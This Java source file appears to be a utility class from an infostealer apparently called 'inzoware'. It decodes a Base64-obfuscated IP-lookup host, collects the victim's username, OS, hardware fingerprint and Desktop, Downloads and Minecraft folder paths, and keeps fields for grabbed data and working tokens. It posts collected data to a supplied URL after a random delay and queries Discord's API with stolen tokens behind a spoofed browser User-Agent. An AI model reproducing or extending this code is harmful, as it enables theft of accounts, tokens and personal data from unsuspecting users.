package com.inzo.technologies.inzoware.utils;

import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.Base64;

import javax.net.ssl.HttpsURLConnection;

import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.RequestBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class InitUtils {

    public static String getIP() {
        try {
            @SuppressWarnings("resource")

            Base64.Decoder dec = Base64.getDecoder();
            String IIllIlIll = "Y2hlY2tpcC5hbWF6b25hd3MuY29t";
            String IIllIlIlI = new String(dec.decode(IIllIlIll));

            Scanner scanner = new Scanner(new URL("http://" + IIllIlIlI + "").openStream(), "UTF-8");
            String ip = scanner.useDelimiter("\\A").next();
            scanner.close();
            return ip;
        }catch(IOException e) {
            e.printStackTrace();
            return "Unknown";
        }
        
    }
    
    public static String getName() {
        String name = System.getProperty("user.name");
        return name;
    }
    
    public static String getOS() {
        String os = System.getProperty("os.name");
        return os;
    }
    
    public static String desktop = "C:\\Users\\" + getName() + "\\Desktop\\";
    public static String downloads = "C:\\Users\\" + getName() + "\\Downloads\\";
    public static String minecraft = "C:\\Users\\" + getName() + "\\AppData\\Roaming\\.minecraft\\";
    
    public static String dataGrabbings = "";
    
    public ArrayList<String> workingTokens = new ArrayList<>();

    public static String getHWID() { try {
        MessageDigest hash = MessageDigest.getInstance("MD5");
        String s = getOS() + System.getProperty("os.arch") + System.getProperty("os.version") + Runtime.getRuntime().availableProcessors() + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_ARCHITECTURE") + System.getenv("PROCESSOR_ARCHITEW6432") + System.getenv("NUMBER_OF_PROCESSORS");
        return bytesToHex(hash.digest(s.getBytes())); } catch (Exception e) { return "######################"; }
    }

    private static String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; j++) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = "0123456789ABCDEF".toCharArray()[v >>> 4];
            hexChars[j * 2 + 1] = "0123456789ABCDEF".toCharArray()[v & 0x0F];
        }
        return new String(hexChars);
    }
    
    @SuppressWarnings("all")
    public static void sendData(String msg, String url, String username) {
        try {
            Thread.sleep((int) Math.floor(Math.random()*(675-225+1)+225));
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        }
        CloseableHttpClient httpclient = HttpClients.createDefault();
    try {
        HttpUriRequest httppost = null;
        try {
            httppost = RequestBuilder.post()
                    .setUri(new URI(url))
                    .addParameter("content", msg)
                    .addParameter("username", username)
                        .build();
            } catch (URISyntaxException e) {
                e.printStackTrace();
            }
 
            CloseableHttpResponse response = null;
            try {
                response = httpclient.execute(httppost);
            } catch (ClientProtocolException e) {
                e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                try {
                  } finally {
                      try {
                        response.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
       }
                 } finally {
                  try {
                        httpclient.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                }
                 }
    }
    
    public static String sendDiscordInfo(String token, String apiLink, String username) {
        String oainds = "";
        try {
            String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
            URL url = new URL("https://discordapp.com/api/v7/" + apiLink);
            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("GET");
            connection.setRequestProperty("Authorization", token);
            connection.setRequestProperty("User-Agent", userAgent);
            InputStream response = connection.getInputStream();
            // Credits to Xefer-0 on github for the Scanner scanner code.
            try(Scanner scanner = new Scanner(response)){
                String responseBody = scanner.useDelimiter("\\A").next();
                oainds = responseBody;
            }catch(Exception e) {
                e.printStackTrace();
            }
        } catch (Exception e) {
            // no.
        }
        return oainds;
        
    }
    
    public static boolean hasBeenPwned(String email) {
        try {
            String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
            URL url = new URL("https://haveibeenpwned.com/unifiedsearch/" + email);
            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", userAgent);
            InputStream response = connection.getInputStream();
            try(Scanner scanner = new Scanner(response)){
                String responseBody = scanner.useDelimiter("\\A").next();
                if(responseBody.contains("\"Title\":")) {
                    return true;
                }
            }catch(Exception e) {
                e.printStackTrace();
            }
        }catch(IOException e) {
            return false;
        }
        return false;
    }
    
}
